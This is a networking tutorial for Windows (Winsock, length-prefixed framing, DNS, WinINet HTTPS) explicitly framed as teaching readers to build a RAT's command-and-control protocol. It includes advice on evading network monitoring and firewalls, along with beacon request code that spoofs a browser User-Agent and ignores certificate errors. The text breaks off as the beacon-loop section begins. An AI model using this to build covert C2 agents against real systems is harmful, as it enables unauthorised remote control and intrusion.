# Module 07 — Networking
### From Zero to Writing Your Own C2 Protocol

---

> **How to read this:** Read every section in order. Do not skip. Each section
> builds directly on the one before it. Every code block is explained line by
> line — you should be able to look at any line and say out loud exactly what it
> does and why it is there.

---

## Part 1 — What Even Is Networking?

Before touching a single line of code, you need a mental model of how computers
talk to each other. Without this model, the code will be magic. With it, the
code is obvious.

### The fundamental problem

Imagine two computers sitting in different rooms. You want Program A (running on
Computer 1) to send the number `42` to Program B (running on Computer 2).

Three problems you must solve:

1. **Physical**: how do the bits actually travel? (cable, wifi, fiber)
2. **Addressing**: how does Computer 2 know the data is for it, and not for the
   100 other computers on the same cable?
3. **Delivery**: how do you guarantee the data arrives complete and in order?

Networking is the set of rules (protocols) that solve all three problems. You
do not need to implement them — your OS and hardware already do. But you need
to understand what layer you are working at.

---

### The Layers (simplified — the ones that matter to you)

Think of networking like an envelope system:

```
Your program
     │
     ▼
  [ Application layer ]  — what your data means (HTTP, DNS, your C2 protocol)
     │
     ▼
  [ Transport layer ]    — HOW data is delivered (TCP or UDP)
     │
     ▼
  [ Internet layer ]     — WHERE it goes (IP addresses, routing)
     │
     ▼
  [ Physical/Link ]      — cables, wifi signals (you never touch this)
```

As a programmer you almost always work at the **Transport** and **Application**
layers. The OS handles everything below.

**Transport layer** gives you two choices:
- **TCP** — like a phone call. A connection is established, data is guaranteed
  to arrive in order and complete. If a packet is lost, TCP retransmits it.
- **UDP** — like dropping a postcard in a mailbox. Fast, no connection, no
  guarantee. A packet might be lost or arrive out of order.

**For C2, RATs, and most security tools: you use TCP.** You need reliability.

---

### IP Addresses — the postal address of a computer

Every device on a network has an IP address. Think of it as a street address.

**IPv4** (the one you will see most): 4 numbers, each 0–255, separated by dots.
```
192.168.1.100
```

This is actually a 32-bit integer stored as 4 bytes:
```
192  = 0xC0
168  = 0xA8
  1  = 0x01
100  = 0x64

Full integer: 0xC0A80164
```

**Private vs public addresses:**

| Range | What it is |
|-------|-----------|
| 10.x.x.x | Private (your home/office LAN) |
| 192.168.x.x | Private (your home router) |
| 172.16–31.x.x | Private |
| Everything else | Public (reachable from the internet) |

Your laptop might have address `192.168.1.5` — that is only meaningful inside
your home network. From the internet, your whole house appears as one address
(your router's public IP). This is called NAT (Network Address Translation).

**Why this matters for you:** A RAT phoning home to `192.168.1.100` only works
if both machines are on the same LAN. A real C2 server needs a public IP.

---

### Ports — the apartment number

An IP address identifies a machine. A **port** identifies a specific program
on that machine.

Think of an IP as a building address and a port as the apartment number.
When a packet arrives at `192.168.1.5:4444`, it goes to the program that is
listening on port 4444 of that machine.

**Port facts you must know:**
- Ports are 16-bit numbers: 0–65535
- Ports 0–1023 are "well-known" (reserved): 80=HTTP, 443=HTTPS, 22=SSH, 53=DNS
- Ports 1024–49151 are registered (apps can use them)
- Ports 49152–65535 are dynamic/ephemeral (OS assigns these to outgoing connections)

When your browser connects to `google.com:443`, Google's server is listening on
port 443. Your browser is assigned an ephemeral port like 51234 for its side of
the connection.

**A connection = (src IP, src port, dst IP, dst port)** — all four together
uniquely identify one connection.

---

### What Actually Happens When You Connect

This sequence happens every time you call `connect()`:

```
Client                              Server
  │                                    │
  │─── SYN (I want to connect) ───────▶│
  │◀── SYN-ACK (OK, I'm ready) ────────│
  │─── ACK (Great, let's go) ─────────▶│
  │                                    │
  │  ← connection established →        │
  │                                    │
  │─── data ──────────────────────────▶│
  │◀── data ────────────────────────────│
  │                                    │
  │─── FIN ───────────────────────────▶│
  │◀── FIN-ACK ─────────────────────────│
```

This is the **TCP three-way handshake**. Your OS does it automatically when you
call `connect()`. You never see it in your code — but you must know it happens.

When `connect()` returns successfully, the handshake is complete. The connection
is established. Data can now flow in both directions.

---

## Part 2 — Sockets

A **socket** is the programming interface to the network. It is a file-like
object that represents one end of a network connection.

Think of a socket like a pipe: you write bytes into one end, they travel through
the network, and come out the other end. The OS handles all the TCP/IP details.
You just read and write to the socket.

You get a socket by calling `socket()`. You then configure it and either
`connect()` it (client) or `bind()`/`listen()`/`accept()` it (server).

---

## Part 3 — Winsock: Sockets on Windows

On Linux/Mac, the socket API is built into the C standard library. On Windows,
it lives in a separate library called **Winsock** (Windows Socket API). It is
nearly identical to the POSIX socket API — same functions, same ideas — but
requires an explicit initialization step.

### Why does Windows require initialization?

When Winsock was designed in the early 1990s, Microsoft wanted the networking
stack to be loadable on demand — not always in memory. The `WSAStartup` call
loads the networking DLL (ws2_32.dll) and tells it which version you want.
Today this is a legacy requirement, but it is still mandatory.

### Setting up Winsock — the required boilerplate

```cpp
#include <winsock2.h>   // main Winsock header — always include BEFORE windows.h
#include <ws2tcpip.h>   // adds modern functions like inet_pton, getaddrinfo
#include <string>
#include <cstdio>

#pragma comment(lib, "ws2_32.lib")  // tells the linker to link ws2_32.dll
                                     // alternative: compile with -lws2_32
```

**Why `winsock2.h` must come before `windows.h`:**
`windows.h` includes an older version of `winsock.h` (version 1). If you
include `windows.h` first, you get version 1 types that conflict with version 2.
Always include `winsock2.h` first, or define `WIN32_LEAN_AND_MEAN` before
including `windows.h`.

```cpp
bool initWinsock() {
    WSADATA wsaData;
    // WSAStartup(version, output_struct)
    // MAKEWORD(2, 2) means "I want Winsock version 2.2"
    // wsaData receives info about the Winsock implementation
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        printf("WSAStartup failed: %d\n", result);
        return false;
    }
    return true;
}
```

At the end of your program:
```cpp
WSACleanup();  // releases the Winsock DLL resources
```

**Rule:** Every program that uses Winsock calls `WSAStartup` once at startup
and `WSACleanup` once at shutdown. Always. No exceptions.

---

## Part 4 — Error Handling

Before writing any socket code, you must understand how errors work. Skipping
this is why beginners write code that silently fails.

Every Winsock function returns a value that indicates success or failure:
- Most functions return `SOCKET_ERROR` (-1) on failure
- `socket()` returns `INVALID_SOCKET` on failure
- `accept()` returns `INVALID_SOCKET` on failure

When a function fails, call `WSAGetLastError()` to get the error code.

```cpp
SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if (sock == INVALID_SOCKET) {
    printf("socket() failed: %d\n", WSAGetLastError());
    return false;
}
```

**Common error codes:**
| Code | Meaning |
|------|---------|
| WSAECONNREFUSED (10061) | Nothing is listening on that port |
| WSAETIMEDOUT (10060) | Connection timed out (host unreachable or firewall) |
| WSAEADDRINUSE (10048) | Port already in use (your server is already running) |
| WSAEHOSTUNREACH (10065) | No route to host |
| WSAECONNRESET (10054) | Connection reset by remote side (they closed it hard) |

**Best practice:** wrap every Winsock call in an error check. In real code you
create a helper. In exercises, at minimum print the error code.

---

## Part 5 — Creating a Socket

```cpp
SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
```

Three arguments:

**`AF_INET`** — Address Family INET. Means "I am using IPv4 addresses."
- `AF_INET6` = IPv6
- `AF_INET` = IPv4 (what you will use)

**`SOCK_STREAM`** — Socket type.
- `SOCK_STREAM` = TCP (stream, reliable, ordered)
- `SOCK_DGRAM` = UDP (datagram, unreliable, unordered)

**`IPPROTO_TCP`** — Protocol. With `SOCK_STREAM` this is always TCP.
You can also pass `0` here and the OS infers TCP from `SOCK_STREAM`.

**What `socket()` returns:** a `SOCKET`, which on Windows is an integer handle
(like a file handle). It represents the socket in the OS. You use this handle
in all subsequent calls. `INVALID_SOCKET` means failure.

---

## Part 6 — IP Addresses in Code: `sockaddr_in`

To tell the OS WHERE to connect or listen, you fill in a `sockaddr_in` struct:

```cpp
struct sockaddr_in {
    short          sin_family;  // address family: always AF_INET
    unsigned short sin_port;    // port number in network byte order
    struct in_addr sin_addr;    // IP address
    char           sin_zero[8]; // padding, always zero
};
```

**Why is there a `sin_family` in the struct?** The socket API was designed to
work with multiple address families (IPv4, IPv6, Bluetooth, etc.). All of these
structs share the same `connect()`/`bind()` functions. The `sin_family` field
tells the OS which type of address is in the struct.

**The cast `(struct sockaddr*)`:** `connect()` and `bind()` take a
`sockaddr*` — a generic address pointer. You always pass a `sockaddr_in*`
cast to `sockaddr*`. This is normal C — the OS uses `sin_family` to know
which actual struct type it is.

### Setting the IP address

```cpp
struct sockaddr_in addr = {};  // zero-initialize everything
addr.sin_family = AF_INET;
```

**To set a specific IP from a string:**
```cpp
inet_pton(AF_INET, "192.168.1.100", &addr.sin_addr);
```

`inet_pton` = "internet presentation to network" — converts a human-readable
IP string ("192.168.1.100") into the 4-byte binary format the struct needs.
`inet_pton` is the modern replacement for the old `inet_addr()`.

**To listen on all available interfaces (server-side):**
```cpp
addr.sin_addr.s_addr = INADDR_ANY;  // = 0.0.0.0
```
`INADDR_ANY` means "accept connections on any IP address this machine has."
A server always uses this unless you want to restrict to one interface.

---

## Part 7 — Network Byte Order (VERY Important)

This trips up almost every beginner. Read this carefully.

### The problem: endianness

Integers are stored in memory as bytes. Two conventions exist for the ORDER of
those bytes:

**Little-endian** (x86/x64 — your CPU):
The number `4444` (0x115C in hex) is stored as: `5C 11` (least significant byte
first).

**Big-endian** (network standard):
The number `4444` is stored as: `11 5C` (most significant byte first).

If you put `4444` directly into `sin_port` on your x64 machine, the bytes in
memory are `5C 11`. The network sees `5C 11` and interprets it as `23580` — a
completely wrong port number.

**You must always convert integers before putting them into network headers.**

### The conversion functions

```cpp
// Host to Network (your CPU → network format)
uint16_t htons(uint16_t x);   // "host to network short" — for ports (16-bit)
uint32_t htonl(uint32_t x);   // "host to network long"  — for IPv4 (32-bit)

// Network to Host (network format → your CPU)
uint16_t ntohs(uint16_t x);   // "network to host short"
uint32_t ntohl(uint32_t x);   // "network to host long"
```

**Rule:** Any integer that goes INTO a network struct → call `htons`/`htonl`.
Any integer you READ FROM a network struct → call `ntohs`/`ntohl`.

**Strings are NOT affected.** Byte order only applies to integers. A string
`"HELLO"` is the same bytes in any byte order.

### In practice:
```cpp
addr.sin_port = htons(4444);   // ALWAYS use htons for ports
                                // never: addr.sin_port = 4444;
```

On big-endian hardware (rare today), `htons(x)` is a no-op. On little-endian
(your machine), it swaps the bytes. Your code is correct on both because you
always call the conversion function.

---

## Part 8 — TCP Client: Connecting to a Server

A TCP client does three things: create socket → connect → exchange data.

Here is the full client with every line explained:

```cpp
#include <winsock2.h>
#include <ws2tcpip.h>
#include <cstdio>
#include <cstring>
#pragma comment(lib, "ws2_32.lib")

bool tcp_client_example() {
    // ── Step 1: Initialize Winsock ──────────────────────────────────────────
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("WSAStartup failed\n");
        return false;
    }

    // ── Step 2: Create the socket ───────────────────────────────────────────
    // AF_INET   = IPv4
    // SOCK_STREAM = TCP (reliable, ordered stream)
    // IPPROTO_TCP = TCP protocol
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("socket() failed: %d\n", WSAGetLastError());
        WSACleanup();
        return false;
    }
    // At this point: sock is a valid socket handle, not connected yet.
    // Think of it as a blank telephone handset — ready but not yet dialing.

    // ── Step 3: Set up the destination address ──────────────────────────────
    struct sockaddr_in server = {};  // zero all fields first
    server.sin_family = AF_INET;     // IPv4

    // Convert port 4444 to network byte order and store it
    server.sin_port = htons(4444);

    // Convert IP string to binary and store it
    // inet_pton returns 1 on success, 0 on invalid address, -1 on error
    if (inet_pton(AF_INET, "127.0.0.1", &server.sin_addr) != 1) {
        printf("Invalid IP address\n");
        closesocket(sock);
        WSACleanup();
        return false;
    }

    // ── Step 4: Connect to the server ───────────────────────────────────────
    // connect() performs the TCP three-way handshake.
    // It BLOCKS until the connection is established or fails.
    // (sockaddr*) is a cast — connect() works for any address family
    // sizeof(server) tells it the size of the address struct
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("connect() failed: %d\n", WSAGetLastError());
        // WSAECONNREFUSED = nothing listening on that port
        // WSAETIMEDOUT    = host exists but isn't responding
        closesocket(sock);
        WSACleanup();
        return false;
    }
    // At this point: the connection is established. Data can flow.
    printf("Connected!\n");

    // ── Step 5: Send data ───────────────────────────────────────────────────
    const char* message = "Hello from client";
    int messageLen = (int)strlen(message);

    // send(socket, data_pointer, length, flags)
    // flags = 0 means default behavior (no special options)
    // Returns: number of bytes actually sent, or SOCKET_ERROR
    //
    // IMPORTANT: send() may send FEWER bytes than you asked for!
    // This is called a partial send. For small messages it almost never
    // happens, but you should always handle it in production code.
    int bytesSent = send(sock, message, messageLen, 0);
    if (bytesSent == SOCKET_ERROR) {
        printf("send() failed: %d\n", WSAGetLastError());
    } else {
        printf("Sent %d bytes\n", bytesSent);
    }

    // ── Step 6: Receive data ────────────────────────────────────────────────
    char buffer[1024] = {};  // always zero the buffer before receiving
    // recv(socket, buffer, max_bytes, flags)
    // Returns: number of bytes received, 0 = connection closed, SOCKET_ERROR
    //
    // recv() BLOCKS until at least 1 byte arrives or the connection closes.
    // It may return fewer bytes than the buffer size — that is normal.
    // It does NOT add a null terminator — do it yourself.
    int bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (bytesReceived == SOCKET_ERROR) {
        printf("recv() failed: %d\n", WSAGetLastError());
    } else if (bytesReceived == 0) {
        printf("Connection closed by server\n");
    } else {
        buffer[bytesReceived] = '\0';  // manually null-terminate
        printf("Received: %s\n", buffer);
    }

    // ── Step 7: Close the socket ────────────────────────────────────────────
    // closesocket() sends a FIN to the other side, signaling end of connection
    closesocket(sock);

    // ── Step 8: Clean up Winsock ────────────────────────────────────────────
    WSACleanup();
    return true;
}
```

---

## Part 9 — TCP Server: Accepting Connections

A server is more complex than a client because it must handle MULTIPLE clients
over its lifetime. The flow is:

```
socket() → bind() → listen() → accept() → [handle client] → accept() → ...
```

### Why four steps instead of two?

- `socket()` — creates the socket object (same as client)
- `bind()` — "claims" a port. Without this, the OS would assign a random port.
  A server needs a KNOWN port so clients know where to connect.
- `listen()` — switches the socket from "I might connect" mode to "I accept
  incoming connections" mode. Also sets a queue for incoming connections.
- `accept()` — waits for a client to arrive and returns a NEW socket for that
  specific client. The original "listening socket" stays open to accept more.

**Key insight:** `accept()` returns a BRAND NEW socket. The listening socket
continues listening. The new socket is for talking to that one client. This is
how a server handles multiple clients — one socket per client.

```cpp
bool tcp_server_example() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    // ── Step 1: Create the listening socket ─────────────────────────────────
    SOCKET listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSock == INVALID_SOCKET) {
        printf("socket() failed: %d\n", WSAGetLastError());
        WSACleanup();
        return false;
    }

    // ── Optional but important: SO_REUSEADDR ────────────────────────────────
    // After you close a server, the port stays in TIME_WAIT state for ~60s.
    // If you restart your server before that, bind() fails with WSAEADDRINUSE.
    // SO_REUSEADDR allows rebinding immediately.
    int reuse = 1;
    setsockopt(listenSock, SOL_SOCKET, SO_REUSEADDR,
               (const char*)&reuse, sizeof(reuse));

    // ── Step 2: Bind to a port ───────────────────────────────────────────────
    struct sockaddr_in serverAddr = {};
    serverAddr.sin_family      = AF_INET;
    serverAddr.sin_port        = htons(4444);
    serverAddr.sin_addr.s_addr = INADDR_ANY;  // 0.0.0.0 = all interfaces
    // INADDR_ANY means: accept connections on any IP this machine has.
    // If your machine has IPs 192.168.1.5 AND 10.0.0.1, clients can connect
    // to either one. If you used a specific IP here, only that interface works.

    if (bind(listenSock, (struct sockaddr*)&serverAddr,
             sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("bind() failed: %d\n", WSAGetLastError());
        // WSAEADDRINUSE means port 4444 is already taken
        closesocket(listenSock);
        WSACleanup();
        return false;
    }

    // ── Step 3: Listen for incoming connections ──────────────────────────────
    // The second argument (5) is the BACKLOG — how many pending (unaccepted)
    // connections the OS will queue while you are busy handling another.
    // If 6 clients connect before you call accept(), the 6th gets CONNREFUSED.
    // For a single-threaded server handling one client at a time, 5 is fine.
    if (listen(listenSock, 5) == SOCKET_ERROR) {
        printf("listen() failed: %d\n", WSAGetLastError());
        closesocket(listenSock);
        WSACleanup();
        return false;
    }
    printf("Server listening on port 4444...\n");

    // ── Step 4: Accept a client ──────────────────────────────────────────────
    // accept() BLOCKS here until a client connects.
    // clientAddr will be filled with the client's IP and port.
    struct sockaddr_in clientAddr = {};
    int addrLen = sizeof(clientAddr);

    SOCKET clientSock = accept(listenSock,
                               (struct sockaddr*)&clientAddr,
                               &addrLen);
    if (clientSock == INVALID_SOCKET) {
        printf("accept() failed: %d\n", WSAGetLastError());
        closesocket(listenSock);
        WSACleanup();
        return false;
    }

    // Print the client's IP address
    char clientIP[INET_ADDRSTRLEN] = {};
    // inet_ntop = "network to presentation" — binary IP → string
    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, sizeof(clientIP));
    printf("Client connected from %s:%d\n", clientIP, ntohs(clientAddr.sin_port));
    // Note: ntohs() to convert port FROM network byte order to human-readable

    // ── Step 5: Talk to the client (using clientSock, NOT listenSock) ────────
    // Echo server: read everything the client sends and send it right back
    char buf[1024];
    while (true) {
        int received = recv(clientSock, buf, sizeof(buf), 0);
        if (received <= 0) {
            // 0 = client closed connection
            // SOCKET_ERROR = error occurred
            printf("Client disconnected\n");
            break;
        }
        buf[received] = '\0';
        printf("Received: %s\n", buf);

        // Echo back
        send(clientSock, buf, received, 0);
    }

    // ── Step 6: Close the client socket ─────────────────────────────────────
    closesocket(clientSock);
    // listenSock is still open — in a real server you would loop back to
    // accept() here to handle the next client

    closesocket(listenSock);
    WSACleanup();
    return true;
}
```

---

## Part 10 — The Partial Send/Receive Problem (Critical)

This is the single most important thing beginners get wrong with TCP.

### The problem

TCP is a **stream protocol**. It has no concept of "messages." It just moves
a stream of bytes. When you call:

```cpp
send(sock, "HELLO WORLD", 11, 0);
```

TCP might send all 11 bytes in one packet. Or it might send 5 bytes now and
6 bytes a moment later. The receiver might `recv()` and get all 11 bytes. Or
get 5, then 6. Or get 3, then 4, then 4.

**You have NO control over this.** The OS, TCP stack, and network decide how
to chunk it.

Similarly when receiving:
```cpp
char buf[1024];
recv(sock, buf, 1024, 0);
```
This does NOT guarantee you receive 1024 bytes. It returns WHATEVER arrived
so far — could be 1 byte, could be 500, could be 1024.

### Why doesn't this cause problems in practice for tiny messages?

For small messages (under ~1460 bytes) on a local network, TCP usually delivers
everything in one round trip and `recv()` usually returns the whole message.
But "usually" is not "always," and on a slow link, through a proxy, or with
large messages, partial sends/receives are common.

### The correct solution: always loop

**Sending a guaranteed full message:**
```cpp
bool sendAll(SOCKET s, const char* data, int len) {
    int totalSent = 0;
    while (totalSent < len) {
        int sent = send(s, data + totalSent, len - totalSent, 0);
        if (sent == SOCKET_ERROR || sent == 0) return false;
        totalSent += sent;
        // data + totalSent  → pointer arithmetic: moves the pointer forward
        //                     by however many bytes we already sent
        // len - totalSent   → how many bytes remain to send
    }
    return true;
}
```

**Receiving an exact number of bytes:**
```cpp
bool recvAll(SOCKET s, char* buf, int len) {
    int totalReceived = 0;
    while (totalReceived < len) {
        int received = recv(s, buf + totalReceived, len - totalReceived, 0);
        if (received <= 0) return false;  // 0 = closed, -1 = error
        totalReceived += received;
    }
    return true;
}
```

These two functions are the foundation of any reliable protocol you write.

---

## Part 11 — Protocol Design: How Do You Know Where One Message Ends?

TCP gives you a stream of bytes. If you send "HELLO" then "WORLD", the receiver
might get "HELLOWORLD" as one `recv()` call. How does it know two messages
arrived?

This is the **message framing** problem. You need to define how your protocol
marks message boundaries.

### Option 1: Fixed-size messages

Every message is exactly N bytes. Simple but inflexible.

```cpp
// Send a 256-byte packet, padded if needed
struct FixedPacket {
    uint8_t type;
    uint8_t padding[3];
    uint32_t value;
    char data[248];
};
// Always send and receive sizeof(FixedPacket) bytes
```

Used in: game protocols, some hardware protocols.

### Option 2: Delimiter-based

Mark the end of a message with a special byte sequence (like `\r\n` in HTTP).

```
HELLO\r\nWORLD\r\n
```

**Problem:** the delimiter cannot appear IN the data without escaping.
Used in: HTTP/1.1, SMTP, FTP.

### Option 3: Length-prefix (best for binary protocols)

Send the length of the message BEFORE the message data. The receiver reads the
length, then reads exactly that many bytes.

```
[4 bytes: message length as uint32][N bytes: message data]
```

This is what you will use for your C2 protocol.

```
Example: sending the string "SCREENSHOT"
  "SCREENSHOT" = 10 bytes

Wire: 00 00 00 0A 53 43 52 45 45 4E 53 48 4F 54
       │────────┘  │─────────────────────────────┘
       length=10   the actual string
```

**Why length-prefix is best:**
- No ambiguity — you always know exactly how many bytes to read
- Binary-safe — no special characters to escape
- Works for any content (images, executables, encrypted blobs)
- Easy to implement

### Implementing a length-prefixed message protocol

```cpp
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <cstdint>

// Helper: receive exactly 'len' bytes — no more, no less
bool recvExact(SOCKET s, void* buf, int len) {
    char* p = static_cast<char*>(buf);
    int remaining = len;
    while (remaining > 0) {
        int got = recv(s, p, remaining, 0);
        if (got <= 0) return false;   // connection closed or error
        p         += got;
        remaining -= got;
    }
    return true;
}

// Helper: send exactly 'len' bytes
bool sendExact(SOCKET s, const void* data, int len) {
    const char* p = static_cast<const char*>(data);
    int remaining = len;
    while (remaining > 0) {
        int sent = send(s, p, remaining, 0);
        if (sent <= 0) return false;
        p         += sent;
        remaining -= sent;
    }
    return true;
}

// Send a length-prefixed message
bool sendMessage(SOCKET s, const std::string& msg) {
    // 1. Convert message size to network byte order (big-endian)
    uint32_t len = htonl(static_cast<uint32_t>(msg.size()));

    // 2. Send the 4-byte length header
    if (!sendExact(s, &len, 4)) return false;

    // 3. Send the actual message bytes
    if (!msg.empty()) {
        if (!sendExact(s, msg.data(), static_cast<int>(msg.size())))
            return false;
    }
    return true;
}

// Receive a length-prefixed message
// Returns empty string on error, the message on success
std::string recvMessage(SOCKET s) {
    // 1. Read the 4-byte length header
    uint32_t netLen = 0;
    if (!recvExact(s, &netLen, 4)) return "";

    // 2. Convert from network byte order to host byte order
    uint32_t len = ntohl(netLen);

    // 3. Sanity check — reject absurdly large messages
    //    (protects against malformed/malicious data)
    if (len == 0) return "";         // empty message, treat as error
    if (len > 64 * 1024 * 1024) {   // refuse messages over 64 MB
        return "";
    }

    // 4. Allocate buffer and receive the message body
    std::string msg(len, '\0');
    if (!recvExact(s, &msg[0], static_cast<int>(len))) return "";

    return msg;   // success
}
```

**Using this protocol:**
```cpp
// Server side:
std::string command = "SCREENSHOT";
sendMessage(clientSock, command);

// Client side:
std::string received = recvMessage(sock);
// received == "SCREENSHOT"
// Guaranteed — no partial receives, no boundary ambiguity
```

---

## Part 12 — DNS: How Hostnames Become IP Addresses

When you type `google.com`, your computer does not know what IP that is. It
asks a DNS (Domain Name System) server. DNS is a distributed database that
maps names to IPs.

You rarely need to implement DNS yourself — `getaddrinfo()` does it for you.

```cpp
// Connect to "example.com" port 80 without knowing the IP:
struct addrinfo hints = {};
hints.ai_family   = AF_INET;      // want IPv4
hints.ai_socktype = SOCK_STREAM;  // TCP

struct addrinfo* results = nullptr;

// getaddrinfo resolves "example.com" to IP(s) and sets up the sockaddr for you
int err = getaddrinfo("example.com", "80", &hints, &results);
if (err != 0) {
    printf("DNS lookup failed: %s\n", gai_strerror(err));
    return false;
}

// results is a linked list of possible addresses (some hosts have multiple IPs)
// Try each one until one connects:
SOCKET sock = INVALID_SOCKET;
for (struct addrinfo* r = results; r != nullptr; r = r->ai_next) {
    sock = socket(r->ai_family, r->ai_socktype, r->ai_protocol);
    if (sock == INVALID_SOCKET) continue;

    if (connect(sock, r->ai_addr, (int)r->ai_addrlen) == 0) break; // connected!

    closesocket(sock);
    sock = INVALID_SOCKET;
}
freeaddrinfo(results);  // always free the result list

if (sock == INVALID_SOCKET) {
    printf("Could not connect to example.com\n");
    return false;
}
// Connected. Use sock normally.
```

**Why use `getaddrinfo` instead of `inet_pton`?**
`inet_pton` only converts IP strings. `getaddrinfo` also resolves hostnames via
DNS. In your C2, you give the agent a hostname (not a hardcoded IP). If your
C2 server moves to a new IP, you update the DNS record and all agents
automatically reach the new IP without being recompiled.

---

## Part 13 — WinINet: HTTPS Without Implementing TLS

Raw Winsock gives you unencrypted TCP. Implementing TLS (the encryption layer
behind HTTPS) from scratch is thousands of lines of complex cryptography code.

**WinINet** is a Windows API that gives you a high-level HTTP/HTTPS client. It
handles DNS, TCP, TLS, HTTP, redirects, and proxy settings — all automatically.

### Why a security researcher should care about WinINet

1. **Blends in with browser traffic** — WinINet uses the system's proxy settings,
   so a RAT using WinINet goes through the same proxy as the browser. Network
   monitoring tools that see "connection via WinINet" think "browser."

2. **Port 443 is almost always allowed** — corporate firewalls block port 4444
   (custom C2). They almost never block port 443 (HTTPS) because it would break
   the whole internet for employees.

3. **No extra dependencies** — `wininet.dll` ships on every Windows since 3.1.
   No OpenSSL to bundle, no detection by "extra DLLs" scanners.

```cpp
#include <windows.h>
#include <wininet.h>
#include <string>
#include <cstdio>
#pragma comment(lib, "wininet.lib")

// Perform an HTTPS GET request and return the response body as a string
std::string httpsGet(const char* hostname,   // "my-c2-server.com"
                     const char* path,        // "/beacon"
                     INTERNET_PORT port) {    // INTERNET_DEFAULT_HTTPS_PORT = 443

    // ── Step 1: Open an internet session ───────────────────────────────────
    // InternetOpenA initializes WinINet. Think of this like WSAStartup.
    // First arg: user agent string — what WinINet will send as User-Agent header
    // INTERNET_OPEN_TYPE_PRECONFIG = use the system's proxy settings
    HINTERNET hInternet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG,  // use IE/system proxy settings
        nullptr,   // proxy name (null = use system default)
        nullptr,   // proxy bypass list
        0          // flags
    );
    if (!hInternet) {
        printf("InternetOpenA failed: %lu\n", GetLastError());
        return "";
    }

    // ── Step 2: Open a connection to the server ─────────────────────────────
    // This does NOT connect yet — it just stores connection parameters.
    HINTERNET hConnect = InternetConnectA(
        hInternet,            // the session handle from step 1
        hostname,             // server hostname or IP
        port,                 // port number
        nullptr,              // username (null = anonymous)
        nullptr,              // password
        INTERNET_SERVICE_HTTP,// service type (always HTTP for HTTP/HTTPS)
        0,                    // flags
        0                     // context (for async; 0 = synchronous)
    );
    if (!hConnect) {
        printf("InternetConnectA failed: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return "";
    }

    // ── Step 3: Create the HTTP request ────────────────────────────────────
    DWORD flags = INTERNET_FLAG_RELOAD         // do not return cached data
                | INTERNET_FLAG_NO_CACHE_WRITE // do not cache the response
                | INTERNET_FLAG_SECURE;        // use HTTPS/TLS

    HINTERNET hRequest = HttpOpenRequestA(
        hConnect,     // the connection handle
        "GET",        // HTTP method: GET, POST, PUT, DELETE...
        path,         // path on the server: "/beacon", "/result"
        nullptr,      // HTTP version (null = HTTP/1.1)
        nullptr,      // referrer URL
        nullptr,      // accepted content types (null = anything)
        flags,
        0             // context
    );
    if (!hRequest) {
        printf("HttpOpenRequestA failed: %lu\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    // ── Step 4 (optional): Skip certificate validation ─────────────────────
    // Only needed when your C2 uses a self-signed certificate.
    // In production, use a real certificate (Let's Encrypt is free).
    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA         // unknown CA
                   | SECURITY_FLAG_IGNORE_CERT_CN_INVALID    // hostname mismatch
                   | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID; // expired cert
    InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS,
                       &secFlags, sizeof(secFlags));

    // ── Step 5: Send the request ────────────────────────────────────────────
    // This is where the actual TCP connection is made, TLS handshake happens,
    // and the HTTP request is sent.
    if (!HttpSendRequestA(hRequest,
                          nullptr, 0,    // extra headers (none for GET)
                          nullptr, 0)) { // request body (none for GET)
        printf("HttpSendRequestA failed: %lu\n", GetLastError());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    // ── Step 6: Read the response body ─────────────────────────────────────
    // InternetReadFile works like ReadFile — call in a loop until 0 bytes read
    std::string response;
    char buf[4096];
    DWORD bytesRead = 0;
    while (InternetReadFile(hRequest, buf, sizeof(buf), &bytesRead)
           && bytesRead > 0) {
        response.append(buf, bytesRead);
    }

    // ── Step 7: Clean up — close handles in reverse order ──────────────────
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return response;
}

// POST with a request body:
std::string httpsPost(const char* hostname, const char* path,
                      INTERNET_PORT port, const std::string& body) {
    HINTERNET hInternet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);

    HINTERNET hConnect = InternetConnectA(hInternet, hostname, port,
        nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE
                | INTERNET_FLAG_SECURE;
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path,
        nullptr, nullptr, nullptr, flags, 0);

    // Set Content-Type header so the server knows we're sending JSON
    const char* headers = "Content-Type: application/json\r\n";

    // HttpSendRequestA: last two args are the POST body
    HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers),
                     (LPVOID)body.c_str(), (DWORD)body.size());

    std::string response;
    char buf[4096];
    DWORD bytesRead = 0;
    while (InternetReadFile(hRequest, buf, sizeof(buf), &bytesRead)
           && bytesRead > 0) {
        response.append(buf, bytesRead);
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return response;
}
```

---

## Part 14 — Beacon Design: How a RAT Phones Home

A beacon is the heartbeat loop of a RAT. It runs in a loop forever:
